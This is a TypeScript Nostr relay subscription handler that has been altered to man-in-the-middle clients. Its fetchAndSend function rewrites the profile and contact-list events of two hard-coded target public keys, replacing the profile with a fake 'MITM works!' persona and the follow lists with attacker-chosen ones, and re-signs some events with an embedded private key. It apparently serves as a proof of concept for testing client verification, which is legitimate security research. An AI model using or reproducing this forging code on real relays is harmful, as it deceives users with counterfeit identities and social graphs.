import { anyPass, equals, isNil, map, propSatisfies, uniqWith } from 'ramda'
// import { addAbortSignal } from 'stream'
import { pipeline } from 'stream/promises'

import { createEndOfStoredEventsNoticeMessage, createNoticeMessage, createOutgoingEventMessage } from '../utils/messages'
import { IAbortable, IMessageHandler } from '../@types/message-handlers'
import {getEventHash, getPublicKey, isEventMatchingFilter, toNostrEvent} from '../utils/event'
import { streamEach, streamEnd, streamFilter, streamMap } from '../utils/stream'
import { SubscriptionFilter, SubscriptionId } from '../@types/subscription'
import { createLogger } from '../factories/logger-factory'
import { Event } from '../@types/event'
import { IEventRepository } from '../@types/repositories'
import { IWebSocketAdapter } from '../@types/adapters'
import { Settings } from '../@types/settings'
import { SubscribeMessage } from '../@types/messages'
import { WebSocketAdapterEvent } from '../constants/adapter'
import * as secp256k1 from "@noble/secp256k1";
import clone from 'clone'

const debug = createLogger('subscribe-message-handler')

export class SubscribeMessageHandler implements IMessageHandler, IAbortable {
  //private readonly abortController: AbortController

  public constructor(
    private readonly webSocket: IWebSocketAdapter,
    private readonly eventRepository: IEventRepository,
    private readonly settings: () => Settings,
  ) {
    //this.abortController = new AbortController()
  }

  public abort(): void {
    //this.abortController.abort()
  }

  public async handleMessage(message: SubscribeMessage): Promise<void> {

    //console.log('subscribeMsg')
    //console.log(message)
    const subscriptionId = message[1]
    const filters = uniqWith(equals, message.slice(2)) as SubscriptionFilter[]

    const reason = this.canSubscribe(subscriptionId, filters)
    if (reason) {
      debug('subscription %s with %o rejected: %s', subscriptionId, filters, reason)
      this.webSocket.emit(WebSocketAdapterEvent.Message, createNoticeMessage(`Subscription rejected: ${reason}`))
      return
    }

    this.webSocket.emit(WebSocketAdapterEvent.Subscribe, subscriptionId, filters)

    await this.fetchAndSend(subscriptionId, filters)
  }

  private async fetchAndSend(subscriptionId: string, filters: SubscriptionFilter[]): Promise<void> {

    // do MITM on Profile
    const server_privKey = '72434ed46eecea6d09c2cf139014cc27a8fb0cdb7cd55ad13fdbc0fb1ad4fd80'
    const target_pub = '24f235e8a1f16dcfb85c95a7387ff0618251981c7448a84a08ed8058d32b4d6d' // for npub1ynert...
    const target_pub2 = '2c62a6ba421347b19b25812a509e7cac4558162ce3f5ede27b1d0b722a531207' //

    debug('fetching events for subscription %s with filters %o', subscriptionId, filters)
    const sendEvent = (event: Event) =>{
      console.log('sendEvent Server->Client')
      console.log(event)
      if(event.kind==0 && event.pubkey==target_pub){
        console.log('Do MITM on profile')

        //let mitmEvent = clone(event)

        event.pubkey = getPublicKey(server_privKey)
        event.content = '{"display_name":"0BobMITM","website":"","name":"","lud06":"","about":"MITM works!"}'

        getEventHash(event).then((newid)=>{
          secp256k1.schnorr.sign(newid, server_privKey).then((newsig)=>{
            event = {
              id: newid,
              pubkey: event.pubkey,
              //created_at: event.created_at,  // for Damus
              created_at: Math.floor(Date.now() / 1000), // for others
              kind: event.kind,
              tags: event.tags,
              sig: Buffer.from(newsig).toString('hex'),
              content:event.content,
            }

            console.log('MITM event')
            console.log(event)
            this.webSocket.emit(WebSocketAdapterEvent.Message, createOutgoingEventMessage(subscriptionId, event))
          })
        })
      }else if(event.kind==3 && event.pubkey==target_pub2){
        console.log('Do MITM on Contact List')
        event.tags = [['p','c746ffd4285589064d0b160e00646070ba152fcd0841b9aalab22f73a3d53101'], ['p','c746ffa9a01224339daa6d441c290423c81154903d00b9152f59a3b699cbaa95'], ['p','abc6ffa9a01224339daa6d441c290423c81154903d00b9152f59a3b699cbaa95'], ['p', '24f235e8a1f16dcfb85c95a7387ff0618251981c7448a84a08ed8058d32b4d6d']]
        console.log('MITM event')
        console.log(event)
        this.webSocket.emit(WebSocketAdapterEvent.Message, createOutgoingEventMessage(subscriptionId, event))
      }else if(event.kind==3 && event.pubkey==target_pub){
        console.log('Do MITM on Contact List')
        event.pubkey = getPublicKey(server_privKey)
        event.tags = [['p','c746ffd4285589064d0b160e00646070ba152fcd0841b9aalab22f73a3d53101'], ['p','c746ffa9a01224339daa6d441c290423c81154903d00b9152f59a3b699cbaa95']]

        getEventHash(event).then((newid)=>{
          secp256k1.schnorr.sign(newid, server_privKey).then((newsig)=>{
            event = {
              id: newid,
              pubkey: event.pubkey,
              //created_at: event.created_at, //Math.floor(Date.now() / 1000),
              created_at: Math.floor(Date.now() / 1000),
              kind: event.kind,
              tags: event.tags,
              sig: Buffer.from(newsig).toString('hex'),
              content:event.content,
            }

            console.log('MITM event')
            console.log(event)
            this.webSocket.emit(WebSocketAdapterEvent.Message, createOutgoingEventMessage(subscriptionId, event))
          })
        })
      }/*else if(event.kind==3 && event.pubkey==target_pub2){
        console.log('Do MITM on Contact List')
        event.pubkey = getPublicKey(server_privKey)
        event.tags = [['p','c746ffd4285589064d0b160e00646070ba152fcd0841b9aalab22f73a3d53101'], ['p','c746ffa9a01224339daa6d441c290423c81154903d00b9152f59a3b699cbaa95']]

        getEventHash(event).then((newid)=>{
          secp256k1.schnorr.sign(newid, server_privKey).then((newsig)=>{
            event = {
              id: newid,
              pubkey: event.pubkey,
              created_at: event.created_at,
              kind: event.kind,
              tags: event.tags,
              sig: Buffer.from(newsig).toString('hex'),
              content:event.content,
            }

            console.log('MITM event')
            console.log(event)
            this.webSocket.emit(WebSocketAdapterEvent.Message, createOutgoingEventMessage(subscriptionId, event))
          })
        })
      }*/
      else {
        this.webSocket.emit(WebSocketAdapterEvent.Message, createOutgoingEventMessage(subscriptionId, event))
      }
    }
    const sendEOSE = () =>
      this.webSocket.emit(WebSocketAdapterEvent.Message, createEndOfStoredEventsNoticeMessage(subscriptionId))
    const isSubscribedToEvent = SubscribeMessageHandler.isClientSubscribedToEvent(filters)

    const findEvents = this.eventRepository.findByFilters(filters).stream()


    // const abortableFindEvents = addAbortSignal(this.abortController.signal, findEvents)

    try {
      await pipeline(
        findEvents,
        streamFilter(propSatisfies(isNil, 'deleted_at')),
        streamMap(toNostrEvent),
        streamFilter(isSubscribedToEvent),
        streamEach(sendEvent),
        streamEnd(sendEOSE),
      )
    } catch (error) {
      if (error instanceof Error && error.name === 'AbortError') {
        debug('subscription %s aborted: %o', subscriptionId, error)
       findEvents.destroy()
      } else {
        debug('error streaming events: %o', error)
      }
      throw error
    }
  }

  private static isClientSubscribedToEvent(filters: SubscriptionFilter[]): (event: Event) => boolean {
    return anyPass(map(isEventMatchingFilter)(filters))
  }

  private canSubscribe(subscriptionId: SubscriptionId, filters: SubscriptionFilter[]): string | undefined {
    const subscriptions = this.webSocket.getSubscriptions()
    const existingSubscription = subscriptions.get(subscriptionId)

    if (existingSubscription?.length && equals(filters, existingSubscription)) {
        return `Duplicate subscription ${subscriptionId}: Ignorning`
    }

    const maxSubscriptions = this.settings().limits?.client?.subscription?.maxSubscriptions ?? 0
    if (maxSubscriptions > 0
      && !existingSubscription?.length && subscriptions.size + 1 > maxSubscriptions
    ) {
      return `Too many subscriptions: Number of subscriptions must be less than or equal to ${maxSubscriptions}`
    }

    const maxFilters = this.settings().limits?.client?.subscription?.maxFilters ?? 0
    if (maxFilters > 0) {
      if (filters.length > maxFilters) {
        return `Too many filters: Number of filters per susbscription must be less then or equal to ${maxFilters}`
      }
    }
  }
}
